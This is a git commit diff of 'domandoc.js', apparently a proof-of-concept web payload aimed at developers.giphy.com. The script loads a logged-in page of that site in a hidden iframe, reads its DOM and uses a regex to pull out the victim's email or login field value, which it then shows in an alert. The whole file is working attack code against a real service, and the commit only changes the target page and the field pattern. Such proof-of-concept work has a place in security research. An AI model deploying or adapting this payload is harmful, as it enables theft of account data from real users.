06d9b5f3c0d5dd89ebc4d40164c031db394d67a1
naysser <77415898+naysser@users.noreply.github.com>
2021-08-22 16:46:51 +0200

    Update domandoc.js

--- domandoc.js
+++ domandoc.js
@@ -1,12 +1,12 @@
 setTimeout(function() {
     var profileIframe = document.createElement('iframe');
-    profileIframe.setAttribute('src', 'https://developers.giphy.com/dashboard/');
+    profileIframe.setAttribute('src', 'https://developers.giphy.com/docs/sdk');
     profileIframe.setAttribute('id', 'pi');
     document.body.appendChild(profileIframe);
     //Extract their email as PoC
     profileIframe.onload = function() {
         var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
-        var matches = /value="([^"]+)" name="email"/.exec(d);
+        var matches = /value="([^"]+)" name="login__Text-lkmy7z-5 iovZjr"/.exec(d);
         alert(matches[1]);
     }
 }, 9000);
